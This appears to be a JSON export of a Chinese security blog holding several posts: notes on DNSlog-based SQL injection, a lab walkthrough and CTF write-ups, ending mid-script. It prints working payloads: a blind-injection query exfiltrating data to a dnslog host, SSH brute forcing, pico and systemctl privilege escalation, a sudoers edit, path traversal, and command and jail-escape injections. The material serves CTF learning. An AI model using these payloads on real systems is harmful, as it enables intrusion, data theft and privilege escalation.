[{"title":"dnslog注入学习","url":"/2023/10/18/dnslog注入学习/","content":"\n## 什么是DNSlog\n\nDNS（Domain Name System）域名服务系统，简单的说就是域名与IP转换服务，比如用户输入a.com,DNS就会将a.com解析找到它真实的ip，以便于访问服务器上的相关服务，DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名访问的信息，类似于日志文件。\n\n## DNSlog回显原理\n\n首先我们先了解一下多级域名的概念\n\n[域名分级与域名解析过程(DNS)](https://blog.csdn.net/m0_37263637/article/details/85157611)\n\n因特网采用层次树状结构命名方法。域是名字空间中一个可被管理的划分（按机构组织划分），域可被划分为子域，子域可再被划分，即形成了顶级域名、二级域名、三级域名等。从右向左为顶级域名、二级域名、三级域名等，用点隔开。例如`872323857.github.io`，io就是顶级域名，github就是二级域名，872323857就是三级域名。且域名不分大小写。\n\n![](/pic/DNSLOG/DNSLOG.png)\n\n通俗的说就是我有个已注册的域名a.com，我在域名代理商那里将域名设置对应的ip 1.1.1.1  上，这样当我向dns服务器发起a.com的解析请求时，DNSlog中会记录下他给a.com解析，解析值为1.1.1.1，而我们这个解析的记录的值就是我们要利用的地方。\n\n自己操作一下才能更好的理解，首先在http://www.dnslog.cn/上获得一个域名，然后我们ping一下\n\n![](/pic/DNSLOG/DNSLOG2.png)\n\n我们将1换成别的试试\n\n![](/pic/DNSLOG/DNSLOG3.png)\n\n可以看到解析的日志会把%USERNAME%的值给带出来，因为系统在ping命令之前会将%USERNAME%的值解析出来，然后再和域名拼接起来。\n\n## DNSlog利用\n\n### sql注入\n\n![](/pic/DNSLOG/DNSLOG4.png)\n\n就以sql盲注为例，后端数据库用的mysql数据库，说一下用dnslog回显只能用于windows系统，为什么呢。因为在利用sql盲注进行DNSlog回显时，需要用到load_file函数，这个函数可以进行DNS请求。那\n和只能在windows上用有什么关系呢，这里就涉及到Windows的一个小Tips——**UNC路径**\n\n### UNC路径\n\nUNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。\n \\abc.xxx\\test\n这也就解释了为什么CONCAT()函数拼接了4个\\了,双斜杠表示网络资源路径多加两个\\就是转义了反斜杠。\n 通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。`show variables like '%secure%'`;查看load_file()可以读取的磁盘。\n 1、当secure_file_priv为空，就可以读取磁盘的目录。\n 2、当secure_file_priv为G:\\，就可以读取G盘的文件。\n 3、当secure_file_priv为null，load_file就不能加载文件。\n 通过设置my.ini来配置。secure_file_priv=\"\"就是可以load_flie任意磁盘的文件。\n\n在mysql中执行命令`select load_file('\\\\\\\\a.a92pjl.dnslog.cn\\\\a');`可以看到\n\n![](/pic/DNSLOG/DNSLOG5.png)\n\n和之前的结合起来构造语句,用sqli靶场来测试\n\n~~~\n' and if((select load_file(concat('\\\\\\\\',(select database()),'.\nbhf0ay.dnslog.cn\\\\abc'))),1,0)--+\n~~~\n\n![](/pic/DNSLOG/DNSLOG6.png)\n\n## 小结\n\nDNSlog注入不止可以用于sql注入，还可以用于xss，xxe，ssrf等，思路打开。\n\n可以参考：\n\nhttps://www.cnblogs.com/Xy--1/p/12896599.html\n","tags":["sql注入","学习记录"],"categories":["学习记录"]},{"title":"SYSTEM_FAILURE_1靶场","url":"/2023/09/16/SYSTEM-FAILURE-1靶场/","content":"\n跟着别人的视频打一下。\n\n靶场直接就给了ip地址，用nmap扫一下端口\n\n![](/pic/sf1/1.png)\n\n开放了445端口,445端口默认开放的是SMB服务，可以利用相关的工具,`smbclient`、`smbmap`\n\n![](/pic/sf1/2.png)\n\n用`smbmap`扫描可以发现有一个匿名的共享,用`smbclient` //ip/anonymous连接，空密码直接回车就行。\n\n![](/pic/sf1/3.png)\n\n查看文件发现只有一个share，用`get share`下载下来,查看share文件。\n\n![](/pic/sf1/4.png)\n\n给了`Admin`和`89492D216D0A212F8ED54FC5AC9D340B`，猜测是账号密码，md5解密得`qazwsxedc`，用xftp连接，或者用lftp连接也可以。\n\n![](/pic/sf1/5.png)\n\nftp可以连接，ssh试过之后也可以连接。利用`linpeas.sh`搜集一下有没有可以提权的东西\n\n> 工具地址：https://github.com/carlospolop/PEASS-ng\n\n![](/pic/sf1/6.png)\n\n但是用户权限太低，没有办法提权。\n\ncd到/Syst3m/F4iluR3,里面有很多文件\n\n![](/pic/sf1/7.png)\n\n他们的大小也都差不多，用`find ./ -size +1696c`命令找一下有没有不正常的文件,确实能找到`file0189.txt`，用`diff`命令可以比一下他与其他的文件有什么不同，但是发现文件内容是一行的，所以要给他们变成单行的。\n\n`cat file0189.txt |xargs -n 1 > /tmp/tmp1` `cat file.txt |xargs -n 1 > /tmp/tmp1`然后再用diff判断他们有什么不同。\n\n\n\n![](/pic/sf1/9.png)\n\n发现后面有一串不一样的，需要解密，base62解密得到`/Sup3rS3cR37`\n\n这个文件夹在`/var/www/html/area4`里,下载useful.txt，查看`/etc/passwd`能发现用户名，利用`hydra`进行爆破\n\n![](/pic/sf1/10.png)\n\n命令:`hydra -L user.txt -P useful.txt ssh://192.168.2.243 -V -I -u -e nsr`  \n\n~~~\n-V 显示详细信息\n-I 忽略现有的恢复文件（不要等待 10 秒）\n-e “n”表示空密码，“s”尝试登录为通过，“r”尝试反向登录为通过\n~~~\n\n![](/pic/sf1/11.png)\n\n可以爆破出来密码，登录valex用户。\n\n![](/pic/sf1/12.png)\n\n`sudo -l`：列出用户可以执行和不可以执行的命令。\n\n可以发现`jin`用户可以用pico。在网上能找到nano的提权方式\n\n执行命令`sudo -u jin /usr/bin/pico` 然后\n\n~~~\n^R^X\nreset; sh 1>&0 2>&0\n~~~\n\n![](/pic/sf1/14.png)\n\n然后就到`jin`这个用户了,这个时候就可以执行`systemctl`了，这个时候就可以用`systemctl`进行提权。\n\n~~~\nTF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"chmod +s /bin/bash\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n~~~\n\n或者修改sudoers\n\n~~~\necho \\\"admin ALL=(ALL:ALL) ALL\">>/etc/sudoers\n~~~\n\n![](/pic/sf1/15.png)\n\n读取到root.txt\n","tags":["内网靶场"],"categories":["内网靶场"]},{"title":"TFCCTF2023","url":"/2023/08/01/TFCCTF2023/","content":"\n# FORENSICS\n\n## DOWN BAD\n\n修改图片的高度就能得到flag\n\n## LIST\n\n比赛的时候与正确答案插肩而过了，我真该死啊。\n\n附件给了一个流量包，追踪TCP流能发现有类似`command=echo+%22ZmluZCAvaG9tZS9jdGYgLXR5cGUgZiAtbmFtZSAiRiIgMj4vZGV2L251bGw%3D%22+%7C+base64+-d+%7C+bash`这种，解码是` find /home/ctf -type f -name \"T\" 2>/dev/null`多解码几个可以发现-name的参数就是flag\n\n可以用`strings list.pcap|grep command`这个代码找到所有的flag，用脚本解码快一点，一个一个解码也可以。\n\n~~~\nimport base64\n\ntraces = open(\"./2.txt\", \"r\").readlines()\n\nbase64_commands = []\n\nfor t in traces:\n    t = t.replace(\"command=echo+%22\", \"\")\n    t = t.replace(\"%22+%7C+base64+-d+%7C+bash\", \"\")\n    t = t.replace(\"%3D\", \"\")\n    t = t.strip()\n\n    print(base64.b64decode(t + \"=\" * (len(t) % 4)).decode()[30], end=\"\")\n\n~~~\n\n","tags":["ctf"],"categories":["ctf"]},{"title":"AmateursCTF2023","url":"/2023/07/19/AmateursCTF2023/","content":"\n# WEB\n\n## waiting-an-eternity\n\n![](/pic/AmateursCTF/web1.png)\n\n看文件头，要等好长事件之后才会刷新,直接访问后面的url\n\n![](/pic/AmateursCTF/web2.png)\n\nsecretcode是md5解密，但是没什么用，Cookie里有`time`是时间戳将他改成`NAN`显示flag\n\n![](/pic/AmateursCTF/web3.png)\n\n## funny factorials\n\n附件给了一个app.py\n\n可控点在这里，通过改变主题得到flag\n\n~~~\ndef filter_path(path):\n    # print(path)\n    path = path.replace(\"../\", \"\")\n    try:\n        return filter_path(path)\n    except RecursionError:\n        # remove root / from path if it exists\n        if path[0] == \"/\":\n            path = path[1:]\n        print(path)\n        return path\n\n~~~\n\n将path里面的`../`删掉了，如果path开头是`/`会忽视掉，但是如果递归超过1000次就会进入`RecursionError`然后访问根目录下的flag.txt就行\n\npayload:\n\n~~~\nPOST /?theme=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../..///flag.txt\n~~~\n\n## latek\n\n关于latek可以看看这篇文章https://www.freebuf.com/articles/security-management/308191.html\n\n![](/pic/AmateursCTF/web4.png)\n\n直接用\\input的话flag输出不完全，问了chatgpt可以用其他方法进行任意文件读取\n\n~~~\n\\documentclass{article}\n\\usepackage{verbatim}\n\\begin{document}\nHello, world!\n\\verbatiminput{/flag.txt}\n\\end{document}\n\n~~~\n\n# REV\n\n## volcano\n\nida分析，先看main函数\n\n~~~c\n__int64 __fastcall main(int a1, char **a2, char **a3)\n{\n  __int64 v4; // rbx\n  __int64 v5; // rbx\n  __int64 v6; // rbx\n  unsigned __int64 v7; // [rsp+8h] [rbp-C8h] BYREF\n  unsigned __int64 v8; // [rsp+10h] [rbp-C0h] BYREF\n  unsigned __int64 v9; // [rsp+18h] [rbp-B8h] BYREF\n  unsigned __int64 v10; // [rsp+20h] [rbp-B0h]\n  FILE *stream; // [rsp+28h] [rbp-A8h]\n  char s[136]; // [rsp+30h] [rbp-A0h] BYREF\n  unsigned __int64 v13; // [rsp+B8h] [rbp-18h]\n\n  v13 = __readfsqword(0x28u);\n  setbuf(stdin, 0LL);\n  setbuf(stdout, 0LL);\n  setbuf(stderr, 0LL);\n  printf(\"Give me a bear: \");\n  v7 = 0LL;\n  __isoc99_scanf(\"%llu\", &v7);\n  if ( !sub_12BB(v7) )\n  {\n    puts(\"That doesn't look like a bear!\");\n    return 1LL;\n  }\n  else\n  {\n    printf(\"Give me a volcano: \");\n    v8 = 0LL;\n    __isoc99_scanf(\"%llu\", &v8);\n    if ( (unsigned __int8)sub_13D9(v8) != 1 )\n    {\n      puts(\"That doesn't look like a volcano!\");\n      return 1LL;\n    }\n    else\n    {\n      printf(\"Prove to me they are the same: \");\n      v9 = 0LL;\n      v10 = 4919LL;\n      __isoc99_scanf(\"%llu\", &v9);\n      if ( (v9 & 1) != 0 && v9 != 1 )\n      {\n        v4 = sub_1209(v8);\n        if ( v4 == sub_1209(v7)\n          && (v5 = sub_124D(v8), v5 == sub_124D(v7))\n          && (v6 = sub_1430(v10, v8, v9), v6 == sub_1430(v10, v7, v9)) )\n        {\n          puts(\"That looks right to me!\");\n          stream = fopen(\"flag.txt\", \"r\");\n          fgets(s, 128, stream);\n          puts(s);\n          return 0LL;\n        }\n        else\n        {\n          puts(\"Nope that's not right!\");\n          return 1LL;\n        }\n      }\n      else\n      {\n        puts(\"That's not a valid proof!\");\n        return 1LL;\n      }\n    }\n  }\n}\n~~~\n\n先看`sub_12BB`和`sub_13D9`这两个\n\n~~~c\n_BOOL8 __fastcall sub_12BB(unsigned __int64 a1)\n{\n  if ( (a1 & 1) != 0 )\n    return 0LL;\n  if ( a1 % 3 != 2 )\n    return 0LL;\n  if ( a1 % 5 != 1 )\n    return 0LL;\n  if ( a1 % 7 == 3 )\n    return a1 % 109 == 55;\n  return 0LL;\n}\n~~~\n\n~~~\n_BOOL8 __fastcall sub_13D9(unsigned __int64 a1)\n{\n  unsigned __int64 v2; // [rsp+8h] [rbp-10h]\n\n  v2 = 0LL;\n  while ( a1 )\n  {\n    v2 += a1 & 1;\n    a1 >>= 1;\n  }\n  return v2 > 16 && v2 <= 26;\n}\n~~~\n\n逻辑很简单，写脚本爆破一下就行\n\n看后面\n\n~~~\n if ( v4 == sub_1209(v7)\n          && (v5 = sub_124D(v8), v5 == sub_124D(v7))\n          && (v6 = sub_1430(v10, v8, v9), v6 == sub_1430(v10, v7, v9)) )\n~~~\n\n前几个完全没用只用考虑最后一个括号里的内容就行。\n\nsub_1430:\n\n~~~c\nunsigned __int64 __fastcall sub_1430(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3)\n{\n  unsigned __int64 v5; // [rsp+10h] [rbp-18h]\n  unsigned __int64 v6; // [rsp+20h] [rbp-8h]\n\n  v6 = 1LL;\n  v5 = a1 % a3;\n  while ( a2 )\n  {\n    if ( (a2 & 1) != 0 )\n      v6 = v5 * v6 % a3;\n    a2 >>= 1;\n    v5 = v5 * v5 % a3;\n  }\n  return v6;\n}\n~~~\n\n直接写脚本爆破就行了\n\nexp:\n\n~~~python\ndef check1(a1):\n    if a1 & 1 != 0:\n        return 0\n    if a1 % 3 != 2:\n        return 0\n    if a1 % 5 != 1:\n        return 0\n    if a1 % 7 == 3:\n        return a1 % 109 == 55\n    return 0\ndef check2(a1):\n    v2 = 0\n    while a1:\n        v2 += a1 & 1\n        a1 >>= 1\n    return 16 < v2 <= 26\ndef s():\n    for i in range(1,10000000):\n        if check1(i) and check2(i):\n            print(i)\ndef a():\n        for i in range(1,10):\n            if ((i & 1) != 0 and (i!= 1)):\n                print(i)\ns() #输出前两个数\na() #输出第三个数\n~~~\n\nbear和volcano的数值一样。\n\n# MISC\n\n# Censorship\n\n给了一个main.py\n\n~~~python\n#!/usr/local/bin/python\nfrom flag import flag\n\nfor _ in [flag]:\n    while True:\n        try:\n            code = ascii(input(\"Give code: \"))\n            if \"flag\" in code or \"e\" in code or \"t\" in code or \"\\\\\" in code:\n                raise ValueError(\"invalid input\")\n            exec(eval(code))\n        except Exception as err:\n            print(err)\n\n~~~\n\n\n\n可以执行python的命令,但是不能有`flag`,`e`,`t`，flag是被定义的但是print里有t没有办法回显，可以用python的内置函数获得print。\n\npayload:\n\n~~~\nvars(globals()[dir()[2]])[globals()[dir()[2]].__dir__()[42]](globals())\n~~~\n\n","tags":["ctf"],"categories":["ctf"]},{"title":"CrewCTF","url":"/2023/07/11/CrewCTF/","content":"\n# WEB\n\n## sequence_gallery \t\t\t\t\t\n\n下载附件\n\n~~~python\n#main.py\nimport os\nimport sqlite3\nimport subprocess\n\nfrom flask import Flask, request, render_template\n\napp = Flask(__name__)\n\n@app.get('/')\ndef index():\n\tsequence = request.args.get('sequence', None)\n\tif sequence is None:\n\t\treturn render_template('index.html')\n\n\tscript_file = os.path.basename(sequence + '.dc') #构造脚本名,将sequence和.dc字符串连接起来，并获取路径中的文件名部分。\n\tif ' ' in script_file or 'flag' in script_file:\n\t\treturn ':('\n\n\tproc = subprocess.run(     #运行dc命令\n\t\t['dc', script_file], \n\t\tcapture_output=True,\n\t\ttext=True,\n\t\ttimeout=1,\n\t)\n\toutput = proc.stdout\n\n\treturn render_template('index.html', output=output)\n\nif __name__ == '__main__':\n\tapp.run(host='0.0.0.0', port=8080)\n\n~~~\n\n~~~\nsubprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, capture_output=False, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None, text=None, env=None, universal_newlines=None)\n\nargs：表示要执行的命令。必须是一个字符串，字符串参数列表。\nstdin、stdout 和 stderr：子进程的标准输入、输出和错误。其值可以是 subprocess.PIPE、subprocess.DEVNULL、一个已经存在的文件描述符、已经打开的文件对象或者 None。subprocess.PIPE 表示为子进程创建新的管道。subprocess.DEVNULL 表示使用 os.devnull。默认使用的是 None，表示什么都不做。另外，stderr 可以合并到 stdout 里一起输出。\ntimeout：设置命令超时时间。如果命令执行时间超时，子进程将被杀死，并弹出 TimeoutExpired 异常。\ncheck：如果该参数设置为 True，并且进程退出状态码不是 0，则弹 出 CalledProcessError 异常。\nencoding: 如果指定了该参数，则 stdin、stdout 和 stderr 可以接收字符串数据，并以该编码方式编码。否则只接收 bytes 类型的数据。\nshell：如果该参数为 True，将通过操作系统的 shell 执行指定的命令。\n~~~\n\n在`subprocess.run()`中`shell`没等于`TRUE`但是容易受到参数的影响\n\n![](/pic/CrewCTF/web1.png)\n\n在kali里用man命令看dc的文档\n\n![](/pic/CrewCTF/web1.1.png)\n\n用`-e`和`!`可以执行命令,空格被过滤了，用其他符号绕过，在最后需要加上`%0a`表示输入了ENTER\n\npayload:`?sequence=-e${IFS}!cat${IFS}*.txt%0A`\n\n得到flag:`crew{10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx} `\n\n放到kali里用dc命令转换为真实的flag\n\n![](/pic/CrewCTF/web1.2.png)\n","tags":["ctf"],"categories":["ctf"]},{"title":"UIUCTF2023","url":"/2023/07/04/UIUCTF023/","content":"\n# MISC\n\n## vimjail1            \n\n这道题一连接就是插入模式，想办法退出插入模式.\n\n~~~\n#entry.sh\n#!/usr/bin/env sh\n\nchmod -r /flag.txt\n\nvim -R -M -Z -u /home/user/vimrc\n\n~~~\n\n以只读、文本不可修改、限制模式、启动并且用`/home/user/vimrc`替代了原有的.vimrc\n\n~~~\n#vimrc\nset nocompatible\nset insertmode\n# 禁用了兼容模式，并且默认启动插入模式\ninoremap <c-o> nope\ninoremap <c-l> nope\ninoremap <c-z> nope\ninoremap <c-\\><c-n> nope\n# 将这些组合键转换为插入单词nope\n~~~\n\n但是可以按两次`ctrl+\\`再按一次`ctrl+n`来绕过，然后用`:e`来读取flag。\n\n`:e`表示编辑一个文件\n\n![](/pic/uiu/vim1.png)\n\n##  vimjail2    \n\n~~~sh\n#entry.sh\n#!/usr/bin/env sh\n\nvim -R -M -Z -u /home/user/vimrc -i /home/user/viminfo\n\ncat /flag.txt\n~~~\n\n以只读模式、文本不可修改、限制模式启动vim，替换了原有的vimrc和viminfo\n\n ~~~\n #vimrc\n set nocompatible\n set insertmode\n \n inoremap <c-o> nope\n inoremap <c-l> nope\n inoremap <c-z> nope\n inoremap <c-\\><c-n> nope\n \n cnoremap a _\n cnoremap b _\n cnoremap c _\n cnoremap d _\n cnoremap e _\n cnoremap f _\n cnoremap g _\n cnoremap h _\n cnoremap i _\n cnoremap j _\n cnoremap k _\n cnoremap l _\n cnoremap m _\n cnoremap n _\n cnoremap o _\n cnoremap p _\n cnoremap r _\n cnoremap s _\n cnoremap t _\n cnoremap u _\n cnoremap v _\n cnoremap w _\n cnoremap x _\n cnoremap y _\n cnoremap z _\n cnoremap ! _\n cnoremap @ _\n cnoremap # _\n cnoremap $ _\n cnoremap % _\n cnoremap ^ _\n cnoremap & _\n cnoremap * _\n cnoremap - _\n cnoremap + _\n cnoremap = _\n cnoremap ` _\n cnoremap ~ _\n cnoremap { _\n cnoremap } _\n cnoremap [ _\n cnoremap ] _\n cnoremap \\| _\n cnoremap \\ _\n cnoremap ; _\n cnoremap < _\n cnoremap > _\n cnoremap , _\n cnoremap . _\n cnoremap / _\n cnoremap ? _\n ~~~\n\n将所有字符都转换成了下划线，绕过方式还是两次`ctrl+\\`+`ctrl+n`，entry.sh中最后有一个`cat /flag`,这意味着退出vim后会打印出flag.\n\n`:q`即可。\n\n## Corny Kernel            \n\n附件给了一个c文件\n\n~~~c\n// SPDX-License-Identifier: GPL-2.0-only\n\n#define pr_fmt(fmt) KBUILD_MODNAME \": \" fmt\n\n#include <linux/module.h>\n#include <linux/init.h>\n#include <linux/kernel.h>\n\nextern const char *flag1, *flag2;\n\nstatic int __init pwny_init(void)\n{\n\tpr_alert(\"%s\\n\", flag1);\n\treturn 0;\n}\n\nstatic void __exit pwny_exit(void)\n{\n\tpr_info(\"%s\\n\", flag2);\n}\n\nmodule_init(pwny_init);\nmodule_exit(pwny_exit);\n\nMODULE_AUTHOR(\"Nitya\");\nMODULE_DESCRIPTION(\"UIUCTF23\");\nMODULE_LICENSE(\"GPL\");\nMODULE_VERSION(\"0.1\");\n~~~\n\n下面的代码的意思是当加载模块的时候输出第一段flag\n\n~~~c\nstatic int __init pwny_init(void)\n{\n\tpr_alert(\"%s\\n\", flag1);\n\treturn 0;\n}\n\n...\n\nmodule_init(pwny_init); #这行代码将 pwny_init 函数注册为模块的初始化函数。在模块加载时，该函数将被调用。\n~~~\n\n首先用`gzip -d pwnymodule.ko.gz`，然后用`insmod pwnymodule.ko`加载这个模块，加载完成后会输出第一串flag。\n\n~~~c\nstatic void __exit pwny_exit(void)\n{\n\tpr_info(\"%s\\n\", flag2);\n}\nmodule_exit(pwny_exit);   #这行代码将 pwny_exit 函数注册为模块的退出函数。在模块被卸载时，该函数将被调用来执行清理操作。\n\n~~~\n\n这一串代码的意思是这个模块在被卸载的时候输出第二段flag,用`rmmod pwnymodule.ko`这个卸载模块,然后用`dmesg`输出内核的信息，在最后会输出两段flag。\n\n## vimjail1.5\n\n~~~sh\n#entry.sh\n#!/usr/bin/env sh\n\nvim -R -M -Z -u /home/user/vimrc\n\n~~~\n\n~~~\n#vimrc\nset nocompatible\nset insertmode\n\ninoremap <c-o> nope\ninoremap <c-l> nope\ninoremap <c-z> nope\ninoremap <c-\\> nope\n~~~\n\n别的没变，但是之前的方法没用了，用`ctrl+r`这个用于执行撤销和重做操作。然后用`=execute(readfile('flag.txt'))`\n\n`=` 是用于执行表达式的命令。`execute()`：`execute()` 函数用于执行 Vim 命令。`readfile('flag.txt')`：使用 Vim 的内置函数 `readfile()` 读取名为 `flag.txt` 的文件内容，并返回一个包含文件内容的列表。就是将flag.txt里面的内容变成命令执行,然后就会报错\n\n![](/pic/uiu/vim1.5.png)\n\n或者，用`=execute(':e flag.txt')`然后按两次回车。\n\n## vimjail2.5\n\n~~~\n#vimrc\nset nocompatible\nset insertmode\n\ninoremap <c-o> nope\ninoremap <c-l> nope\ninoremap <c-z> nope\ninoremap <c-\\> nope\n\ncnoremap a _\ncnoremap b _\ncnoremap c _\ncnoremap d _\ncnoremap e _\ncnoremap f _\ncnoremap g _\ncnoremap h _\ncnoremap i _\ncnoremap j _\ncnoremap k _\ncnoremap l _\ncnoremap m _\ncnoremap n _\ncnoremap o _\ncnoremap p _\ncnoremap r _\ncnoremap s _\ncnoremap t _\ncnoremap u _\ncnoremap v _\ncnoremap w _\ncnoremap x _\ncnoremap y _\ncnoremap z _\ncnoremap ! _\ncnoremap @ _\ncnoremap # _\ncnoremap $ _\ncnoremap % _\ncnoremap ^ _\ncnoremap & _\ncnoremap * _\ncnoremap - _\ncnoremap + _\ncnoremap = _\ncnoremap ` _\ncnoremap ~ _\ncnoremap { _\ncnoremap } _\ncnoremap [ _\ncnoremap ] _\ncnoremap \\| _\ncnoremap \\ _\ncnoremap ; _\ncnoremap < _\ncnoremap > _\ncnoremap , _\ncnoremap . _\ncnoremap / _\ncnoremap ? _\n\n~~~\n\n这个只能输入`:q`，方法基本上差不多，还是`ctrl+r`然后`=`,按`TAB`键可以补全内置代码，然后找到`execute`，最后的命令是`execute(\":q\")`，后会输出flag。\n\n# crypto\n\n## Three-Time Pad                      \n\nhttp://dann.com.br/alexctf2k17-crypto100-many_time_secrets/\n\n看这篇博客，用他的脚本可以解出这道题\n\n~~~python\n#!/usr/bin/python\n## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017\n# @author intrd - http://dann.com.br/ \n# Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)\n\nimport string\nimport collections\nimport sets, sys\n\n# 11 unknown ciphertexts (in hex format), all encrpyted with the same key\nc1 = \"14f5f95b4a252948a8aef177d6c92d82e3016362bd7463f41f40a00ad9e0ccad911b959ef8dfad5f1cc4481ecb64\"\nc2 = \"06e2f65a4c256d0ba8ada164cecd329cae436069f83476e91757e91bd4a4cce2c60a8f9aac8cb14210d55253cd787c0f6a\"\nc3 = \"03f9ea574c267249b2b1ef5d91cd3c99904a3f75873871e94157df0fcbb5d1eab94f9386\"\nciphers = [c1, c2, c3]\n# The target ciphertext we want to crack\ntarget_cipher = \"03f9ea574c267249b2b1ef5d91cd3c99904a3f75873871e94157df0fcbb5d1eab94f9386\"\n\n# XORs two string\ndef strxor(a, b):     # xor two strings (trims the longer input)\n    return \"\".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])\n\n# To store the final key\nfinal_key = [None]*150\n# To store the positions we know are broken\nknown_key_positions = set()\n\n# For each ciphertext\nfor current_index, ciphertext in enumerate(ciphers):\n\tcounter = collections.Counter()\n\t# for each other ciphertext\n\tfor index, ciphertext2 in enumerate(ciphers):\n\t\tif current_index != index: # don't xor a ciphertext with itself\n\t\t\tfor indexOfChar, char in enumerate(strxor(ciphertext.decode('hex'), ciphertext2.decode('hex'))): # Xor the two ciphertexts\n\t\t\t\t# If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one)\n\t\t\t\tif char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index\n\tknownSpaceIndexes = []\n\n\t# Loop through all positions where a space character was possible in the current_index cipher\n\tfor ind, val in counter.items():\n\t\t# If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!\n\t\tif val >= 7: knownSpaceIndexes.append(ind)\n\t#print knownSpaceIndexes # Shows all the positions where we now know the key!\n\n\t# Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!\n\txor_with_spaces = strxor(ciphertext.decode('hex'),' '*150)\n\tfor index in knownSpaceIndexes:\n\t\t# Store the key's value at the correct position\n\t\tfinal_key[index] = xor_with_spaces[index].encode('hex')\n\t\t# Record that we known the key at this position\n\t\tknown_key_positions.add(index)\n\n# Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)\nfinal_key_hex = ''.join([val if val is not None else '00' for val in final_key])\n# Xor the currently known key with the target cipher\noutput = strxor(target_cipher.decode('hex'),final_key_hex.decode('hex'))\n\nprint \"Fix this sentence:\"\nprint ''.join([char if index in known_key_positions else '*' for index, char in enumerate(output)])+\"\\n\"\n\n# WAIT.. MANUAL STEP HERE \n# This output are printing a * if that character is not known yet\n# fix the missing characters like this: \"Let*M**k*ow if *o{*a\" = \"cure, Let Me know if you a\"\n# if is too hard, change the target_cipher to another one and try again\n# and we have our key to fix the entire text!\n\n#sys.exit(0) #comment and continue if u got a good key\n\ntarget_plaintext = \"printed on flammable material so that spies could\"\nprint \"Fixed:\"\nprint target_plaintext+\"\\n\"\n\nkey = strxor(target_cipher.decode('hex'),target_plaintext)\n\nprint \"Decrypted msg:\"\nfor cipher in ciphers:\n\tprint strxor(cipher.decode('hex'),key)\n\nprint \"\\nPrivate key recovered: \"+key+\"\\n\"\n~~~\n\n运行得到flag\n\n## At Home\n\n~~~python\n#chal.py\nfrom Crypto.Util.number import getRandomNBitInteger\n\nflag = int.from_bytes(b\"uiuctf{******************}\", \"big\")\n\na = getRandomNBitInteger(256)\nb = getRandomNBitInteger(256)\na_ = getRandomNBitInteger(256)\nb_ = getRandomNBitInteger(256)\n\nM = a * b - 1\ne = a_ * M + a\nd = b_ * M + b\n\nn = (e * d - 1) // M\n\nc = (flag * e) % n\n\nprint(f\"{e = }\")\nprint(f\"{n = }\")\nprint(f\"{c = }\")\n\n~~~\n\n~~~\ne = 359050389152821553416139581503505347057925208560451864426634100333116560422313639260283981496824920089789497818520105189684311823250795520058111763310428202654439351922361722731557743640799254622423104811120692862884666323623693713\nn = 26866112476805004406608209986673337296216833710860089901238432952384811714684404001885354052039112340209557226256650661186843726925958125334974412111471244462419577294051744141817411512295364953687829707132828973068538495834511391553765427956458757286710053986810998890293154443240352924460801124219510584689\nc = 67743374462448582107440168513687520434594529331821740737396116407928111043815084665002104196754020530469360539253323738935708414363005373458782041955450278954348306401542374309788938720659206881893349940765268153223129964864641817170395527170138553388816095842842667443210645457879043383345869\n~~~\n\n通过c=(flag*e)%n可得\n\n```\nc = (flag * e) % n\nc * e^-1 = (flag * e * e^-1) % n\nc * e^-1 = flag % n\n```\n\n~~~python\nfrom Crypto.Util.number import *\ne = 